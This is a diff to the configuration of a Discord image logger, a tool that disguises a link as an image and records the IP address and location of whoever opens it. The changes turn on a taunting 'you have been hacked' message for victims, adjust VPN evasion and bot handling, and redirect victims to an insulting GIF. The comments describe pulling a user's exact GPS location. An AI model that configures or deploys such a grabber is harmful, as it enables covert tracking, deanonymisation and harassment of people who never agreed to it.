@@ -27,18 +27,18 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Becuz you have been hacked but dont worry cuz i wont do any shit with it", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 0, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 0, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://i1.sndcdn.com/artworks-Gm7Ry7N9QyCpfzto-OCF4yA-t500x500.png" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.google.com/url?sa=i&url=https%3A%2F%2Ftenor.com%2Fview%2Fsybau-shut-your-ass-up-shut-up-broken-heart-gif-5521068677351479599&psig=AOvVaw2iKUTRx6XQoxCgwtY45Q3W&ust=1751907864547000&source=images&cd=vfe&opi=89978449&ved=0CBcQjhxqFwoTCNCRs8zbqI4DFQAAAAAdAAAAABAE" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
